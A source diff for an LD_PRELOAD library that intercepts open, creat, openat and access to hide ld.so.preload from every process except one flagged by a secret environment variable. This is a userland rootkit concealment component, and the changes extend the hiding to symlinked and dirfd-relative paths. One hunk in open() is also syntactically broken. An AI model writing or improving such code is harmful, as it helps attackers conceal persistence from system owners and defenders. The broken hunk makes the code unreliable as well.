@@ -15,6 +15,7 @@ int open(const char *pathname, int flags, mode_t mode) {
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
 	std::string file (pathname);
 	char chArr[2], *chPtr;
+	int ret;
 	
 	
 	assert (opnPtr != NULL);
@@ -23,13 +24,14 @@ int open(const char *pathname, int flags, mode_t mode) {
 	
 	// To check if the caller is our trust process
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return opnPtr (pathname, flags, mode);
+		if ((ret = opnPtr (pathname, flags, mode)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
-	file = getClearName (file);
-	
 	// Is the ld.so.preload opening ?
-	if (!strcmp (prelFileNameClear, file.c_str ())) {
+	if (!strcmp (prelFileName, file.c_str ())) {
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
 		lockAllFile (*fd);
@@ -38,7 +40,11 @@ int open(const char *pathname, int flags, mode_t mode) {
 		
 		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
 		if (-1 == ind) {
-			if (flags & O_CREAT) return opnPtr (pathname, flags & (~O_TRUNC), mode);
+			if (flags & O_CREAT) 
+				if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
+					serr.set (errno);
+				}
+				return ret;
 			else {
 				serr.set (ENOENT);
 				return -1;
@@ -51,16 +57,17 @@ int open(const char *pathname, int flags, mode_t mode) {
 				return -1;
 			}
 			else {
-				int ret = opnPtr (pathname, flags & (~O_TRUNC), mode);
-				if (ret != -1) while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
+				if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
+					serr.set (errno);
+					return ret;
+				}
+				while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
 				return ret;
 			}
 		}
 		// the file created
 		if (flags & O_TRUNC) {
-			struct stat buf;
-			int ret = opnPtr (pathname, O_RDWR | O_TRUNC, 0);
-			if (ret == -1) {
+			if ((ret = opnPtr (pathname, O_RDWR | O_TRUNC, 0)) == -1) {
 				serr.set (errno);
 				return ret;
 			}
@@ -79,14 +86,25 @@ int open(const char *pathname, int flags, mode_t mode) {
 			);
 			
 			close (ret);
-			return opnPtr (pathname, flags & (~O_TRUNC), mode);
+			if ((ret = opnPtr (pathname, flags & (~O_TRUNC), mode)) == -1) {
+				serr.set (errno);
+			}
+			return ret;
 		}
+		
 		// the file have created and we wan't to overwrite it
-		return opnPtr (pathname, flags, mode);
+		if ((ret = opnPtr (pathname, flags, mode)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
+	
 	// this file isn't intersted for us
-	return opnPtr (pathname, flags, mode);
+	if ((ret = opnPtr (pathname, flags, mode)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
@@ -96,6 +114,7 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
 	std::string file (pathname);
 	char *chPtr;
+	int ret;
 	
 	
 	assert (opnPtr != NULL);
@@ -103,12 +122,13 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 	assert (crtPtr != NULL);
 	
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return crtPtr (pathname, mode);
+		if ((ret = crtPtr (pathname, mode)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
-	file = getClearName (file);
-	
-	if (!strcmp (prelFileNameClear, file.c_str ())) {
+	if (!strcmp (prelFileName, file.c_str ())) {
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR);
 		lockAllFile (*fd);
@@ -130,11 +150,15 @@ int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
 					   0
 			  ) == -1 && errno == EINTR
 		);
+		
 		return ret;
 	}
 	
 	
-	return crtPtr (pathname, mode);
+	if ((ret = crtPtr (pathname, mode)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
@@ -143,8 +167,9 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	OPENAT opnPtr = (OPENAT)dlsym (RTLD_NEXT, "open");
 	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
 	PWRITE pwrPtr = (PWRITE)dlsym (RTLD_NEXT, "pwrite");
-	std::string file (pathname);
+	std::string file (pathname), clearName, lnkAim;
 	char chArr[2], *chPtr;
+	int ret;
 	
 	
 	assert (opnAtPtr != NULL);
@@ -153,13 +178,24 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 	assert (pwrPtr != NULL);
 	
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return opnAtPtr (dirfd, pathname, flags, mode);
+		if ((ret = opnAtPtr (dirfd, pathname, flags, mode)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
-	file = getClearName (file);
+	clearName = getClearName (file);
+	if (dirfd == AT_FDCWD)
+		lnkAim = getCwdEasy ();
+	else
+		lnkAim = readLinkName (("/proc/self/fd/" + intToString (dirfd)).c_str ());
 	
 	// Is the ld.so.preload opening ?
-	if (!strcmp (prelFileNameClear, file.c_str ())) {
+	if (!strcmp (prelFileName, file.c_str ()) ||
+		!strcmp (prelFileNameClear, clearName.c_str ()) ||
+		!strcmp (lnkAim.c_str (), linuxConfigPath)
+		)
+	{
 		descr_holder fd (new int (-1));
 		*fd = opnPtr (dynCnfFile.c_str (), O_RDWR, 0);
 		lockAllFile (*fd);
@@ -168,7 +204,12 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 		
 		// we can't read dynamic_cnf.txt, at default we think that this file hasn't exist
 		if (-1 == ind) {
-			if (flags & O_CREAT) return opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
+			if (flags & O_CREAT) {
+				if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) == -1) {
+					serr.set (errno);
+				}
+				return ret;
+			}
 			else {
 				serr.set (ENOENT);
 				return -1;
@@ -180,20 +221,17 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 				serr.set (ENOENT);
 				return -1;
 			} else {
-				int ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
-				if (ret != -1) {
+				if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) != -1) {
 					while (pwrite (*fd, &created, 1, 0) == -1 && errno == EINTR);
-					return ret;
 				} else {
 					serr.set (errno);
-					return ret;
 				}
+				return ret;
 			}
 		}
 		// the file exists
 		if (flags & O_TRUNC) {
-			int ret = opnAtPtr (dirfd, pathname, O_RDWR | O_TRUNC, 0);
-			if (ret == -1) {
+			if ((ret = opnAtPtr (dirfd, pathname, O_RDWR | O_TRUNC, 0)) == -1) {
 				serr.set (errno);
 				return ret;
 			}
@@ -212,14 +250,20 @@ int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
 			);
 			
 			close (ret);
-			return opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode);
+			if ((ret = opnAtPtr (dirfd, pathname, flags & (~O_TRUNC), mode)) == -1) {
+				serr.set (errno);
+			}
+			return ret;
 		}
 		// the file have created and we wan't to overwrite it
 		return opnAtPtr (dirfd, pathname, flags, mode);
 	}
 	
 	// this file isn't intersted for us
-	return opnAtPtr (dirfd, pathname, flags, mode);
+	if ((ret = opnAtPtr (dirfd, pathname, flags, mode)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 int access(const char *pathname, int mode) {
@@ -230,6 +274,7 @@ int access(const char *pathname, int mode) {
 	std::string fileName (pathname);
 	size_t ind;
 	char chArr[2], *chPtr;
+	int ret;
 	
 	
 	assert (acsPtr != NULL);
@@ -238,7 +283,10 @@ int access(const char *pathname, int mode) {
 	
 	// To check if the caller is our trust process
 	if ((chPtr = getenv (envShowName)) && !strcmp (chPtr, envShowFile)) {
-		return acsPtr (pathname, mode);
+		if ((ret = acsPtr (pathname, mode)) == -1) {
+			serr.set (errno);
+		}
+		return ret;
 	}
 	
 	fileName = getClearName (fileName);
@@ -252,7 +300,12 @@ int access(const char *pathname, int mode) {
 			serr.set (ENOENT);
 			return -1;
 		}
-		if (chArr[0] == created) return acsPtr (pathname, mode);
+		if (chArr[0] == created) {
+			if ((ret = acsPtr (pathname, mode)) == -1) {
+				serr.set (errno);
+			}
+			return ret;
+		}
 		else {
 			serr.set (ENOENT);
 			return -1;
@@ -260,7 +313,10 @@ int access(const char *pathname, int mode) {
 	}
 	
 	
-	return acsPtr (pathname, mode);
+	if ((ret = acsPtr (pathname, mode)) == -1) {
+		serr.set (errno);
+	}
+	return ret;
 }
 
 
